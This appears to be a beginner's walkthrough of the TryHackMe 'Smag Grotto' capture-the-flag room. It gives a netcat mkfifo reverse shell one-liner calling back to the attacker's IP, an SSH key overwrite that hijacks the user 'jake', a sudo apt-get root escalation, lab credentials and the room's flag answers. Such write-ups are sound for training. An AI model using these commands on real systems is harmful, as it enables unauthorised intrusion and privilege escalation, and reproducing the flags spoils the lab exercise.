# **SMAG GROTTO — TRY HACK ME-ROOM**

Hello everyone\! This is a beginner-friendly room from the TryHackMe platform titled “SMAG GROTTO.”

![][image1]

This room is classified as easy and is a walkthrough-type challenge. It took me around 20 minutes to complete, and I hope this write-up helps guide you through the process\!

My goal is to help you understand each step and provide clear explanations so that anyone, whether a beginner or experienced, can follow along and understand the reasoning behind each action. I hope this write-up makes the process smoother and easier to grasp.

Enough talk — let’s dive right in, and I hope you enjoy the journey\! :)

![][image2]

First, we deploy the machine. While it’s booting up, go ahead and open your terminal tab and get it ready.

![][image3]

Once it’s up, let’s copy the IP address and connect to the network. We encounter a web-page.

![][image4]

![][image5]

I then initiate an Nmap scan and run a Feroxbuster scan.

***nmap 10.10.6.30 — open \-sV \-O***

***![][image6]***

***http://10.10.6.30/mail/***

Opening the PCAP file in **Wireshark**, we filter for **HTTP POST requests**

**![][image7]**

* **Right-click** on the request → **Follow HTTP Stream**  
* We find **credentials**:

![][image8]

* **Username:** helpdesk  
* **Password:** cH4nG3M3\_n0w  
* We also discover the subdomain **developments.smag.thm**

Next, we **edit the /etc/hosts file** to resolve this subdomain:

***sudo nano /etc/hosts***

Add this line:

***10.10.6.30 developments.smag.thm***

We save the file and open **http://developments.smag.thm** in the browser

Next, We navigate to /login.php and enter the **username & password**

**![][image9]**

**Username: helpdesk**  
**Password: cH4nG3M3\_n0w**

Inside, we try executing **commands**, but it doesn’t work. So, we set up a **reverse shell**

Open a Netcat listener on our machine on a new terminal tab:

![][image10]

***nc \-lvnp 1234***

Execute the reverse shell payload:

![][image11]

***rm \-f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh \-i 2\>&1|nc 10.4.1.240 1234 \>/tmp/f***

***{Replace 10.4.1.240 with our system IP/vpn ipand 1234 with our chosen port}***

Once we get a shell, we upgrade it to an **interactive TTY:**

***python3 \-c ‘import pty; pty.spawn(“/bin/bash”)’***

We now have access as **www-data**

## **Finding SSH Key for Privilege Escalation:**

**![][image12]**

We attempt to read user.txt, but it's **restricted**.

Checking **Crontab**, we find a reference to an **RSA key backup**

***cat /etc/crontab***

Navigating to the **backup folder:**

**![][image13]**

***cd /opt/.backups***  
***ls \-la***  
***cat jake\_id\_rsa.pub.backup***

***![][image14]***

We decide to **replace the SSH key** with our own

## **Generating & Injecting an SSH Key:**

On our **local machine**, we generate an **SSH key:**

**![][image15]**

***ssh-keygen \-t rsa***

* **Filename:** jakethm  
* **No passphrase**

Copy the public key:

![][image16]

***cat jakethm.pub***

It outputs something like this: ssh-rsa AAAAB3… root@kali

Replace the existing key on the target machine:

![][image17]

***echo “ssh-rsa AAAAB3… root@kali” \> jake\_id\_rsa.pub.back**up*

This ensures **our key is now used for authentication, post confirmation:**

**![][image18]**

Now, we navigate to Jake’s home directory:

***cd /home/jake***  
***whoami***

We are still **www-data**, so we attempt SSH access

## **Logging in as Jake via SSH:**

On our local machine, we use our private key to SSH into Jake’s account:

***ssh \-i jakethm jake@10.10.6.30***

Once inside:

![][image19]

***pwd***  
***cd /home***  
***cat user.txt***

We successfully retrieve **user.txt**

iusGorV7EbmxM5AuIe2w499msaSuqU3j

**Next checking sudo privileges:**

**![][image20]**

***sudo \-l***

We see that **apt-get** can be run as root

Using **GTFOBins:** [https://gtfobins.github.io/gtfobins/apt-get/\#sudo](https://gtfobins.github.io/gtfobins/apt-get/#sudo) , we find an exploit for apt-get:

![][image21]

***sudo apt-get update \-o APT::Update::Pre-Invoke::=/bin/sh***

***![][image22]***

This grants us a **root shell**\!

![][image23]

Now, we retrieve the **final flag**

***cd /root***  
***cat root.txt***

uJr6zRgetaniyHVRqqL58uRasybBKz2T
